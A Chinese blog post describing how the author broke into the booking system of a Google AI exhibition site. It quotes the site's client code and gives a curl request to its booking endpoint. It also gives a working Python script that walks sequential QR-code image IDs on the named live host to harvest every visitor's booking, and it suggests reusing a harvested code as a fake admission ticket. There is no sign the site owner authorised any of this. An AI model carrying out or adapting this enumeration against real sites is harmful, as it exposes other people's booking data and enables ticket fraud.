---
layout: post
title: Google AI 展览预订网站分析
tags: [google, ai, crack]
categories:
  - 技术互联
---

### 起因

　　Google 在上海的九月下旬到十月上旬有一个 AI 展览，我得知这个消息的时候已经很晚了，由于国庆假期已经有安排了，预订网站上的可预订时间不多了，而且基本都和我的时间冲突了。我就想着能不能看一下网站源码，看看能不能从网站代码上面得到点有用的东西。

### 源码分析

- 预订页面

　　打开 Chrome 的 Developer tools 看了一下源码，还是比较简单的。而且看得出来写得比较一般，应该是个新手。页面也是前后端分离的，主要的逻辑集中在一段 Ajax 请求代码上，摘抄如下：

```javascript
//生成二维码
function btnData(val_id,opt2,channel){
	var ifData={"fieldId":val_id,"subscribePeople":opt2};
	$.ajax({
		url:"/h5/judgePeople.do",
		type:"post",
		async:true,
		data:ifData,//data数据为空-----需要页面上的数据，暂时没有
		dataType: 'json',
		success:function(data){
			if(data.code==200){//成功的
				var data_json={"fieldId":val_id,"subscribePeople":opt2,"channel":channel};
				$.ajax({
					contentType: 'application/json;charset=utf-8',
					url:"/h5/ajax/addsub.do",
					type:"post",
					data:JSON.stringify(data_json),//data数据为空-----需要页面上的数据，暂时没有
					dataType: 'json',
					success:function(data){
						if(data.code==200){//成功的
							location.href="/h5/qrcode.do?lt_d="+data.data.data.jiami+"&sources="+data.data.data.id;
						}else{
							//tanChuang(data.data.data);
							storageTime=get_cache("StorageTime");
							set_cache("StorageTime",truncate(storageTime));
							location.href="/h5/closesen2.do?channel="+loginChannel;
						}
					},error:function(){
						storageTime=get_cache("StorageTime");
						set_cache("StorageTime",truncate(storageTime));
					}
				});
			}else{
				storageTime=get_cache("StorageTime");
				set_cache("StorageTime",truncate(storageTime));
				tanChuang("该时段仅剩"+data.data.data.sencePeople+"个名额");
			}
		},error:function(){
			storageTime=get_cache("StorageTime");
			set_cache("StorageTime",truncate(storageTime));
		}
	});
}
```

　　其中第一个接口 `/h5/judgePeople.do` 主要是判断选定时段的可预订人数是否满足填写的预订人数。而且发现这里判断是否多次预订的逻辑是用本地 Cache 实现的，就算不懂代码的人，换个浏览器也可以突破限制。
　　第二个接口 `/h5/ajax/addsub.do` 才是主要提交预订信息的接口。因为判断能否预订当前时间段是由服务器端判定的，所以我测试了几个接口都没有成功。

```bash
curl -X POST \
  http://ai.cheerue.com/h5/ajax/addsub.do \
  -H 'Content-Type: application/json' \
  -d '{"fieldId": "167", "subscribePeople": "1"}'
```

　　如果第二个接口调用成功的话，会重新定向到另一个显示的二维码的页面，其中 url 参数会带入预订成功和生成的加密 key，这边的变量直接使用的拼音，看了都想笑，太低级了。

- 二维码页面

　　这个页面是要有刚刚生成的唯一加密 key 和 ID 匹配的，如果随意输入一个参数的话，并不会显示二维码。不过看了一下页面源码，里面找到了调用二维码图片的接口，一开始我以为这个接口也会加密，但仔细发现这个接口，在验证成功是已经预订的 key 之后，直接在页面显示图片。而图片的链接仅仅是使用 ID 拼接的，例如： `img-zxing/10231zxing.png`。我们随便获取一个图片识别一下发现二维码里面的内容就是刚刚 url 里的参数。

　　到这一步，基本就算成功了，剩下的就是数据抓取分析了。

### 数据爬取

　　我们将以二维码图片为突破口，ID 又是递增的，只要循环调用就可以获取所有订阅数据了。首先我们找一个解析二维码的 python 库，这个 GitHub 随便一搜一大堆，我选中了这个 [qrreader](https://github.com/ewino/qreader)。安装成功后，获取预订数据的 python 代码如下：

```python
#!/usr/bin/env python3
# coding: utf-8

from io import BytesIO
import requests
import qreader

url = 'http://ai.cheerue.com/img-zxing/42zxing.png'
try:
    res = requests.get(url)
    data = qreader.read(BytesIO(res.content))
    url = 'http://ai.cheerue.com/h5/ajax/querysubscribe.do?{0}'.format(data)
    ret = requests.get(url)
    print(ret.content.decode())
except Exception as e:
    print(e)
```

　　返回结果如下：

```
{"code":200,"data":{"data":{"sqltime":"09月29日 10:00","subscribePeople":1,"id":42}},"messageData":"处理成功！"}"}
```

　　剩下就是脚本循环调用就可以了。在数据基本全部跑完之后，我们随便找一个合适时间生成的二维码就可以作为预订的凭证了，不过有可能和其他人冲突。另外，我们可以用 `jq` 简单计算一下这次 AI 展览会的预订人数：

```bash
cat data.txt  | jq '.data.data.subscribePeople' | jq -s add
```

### 结论

　　到这篇文章发布，会展已经结束，不会影响展览的正常举办。不过还是希望主办方在选择软件外包的时候能够选择一个靠谱点的公司。这个主要的漏洞可以通过加密接口来修复，但是这个网站源码，看起来确实不太能忍受，很有可能就是一个刚刚从培训班出来的人写的，还不如一个软件学院普通学生的水平。
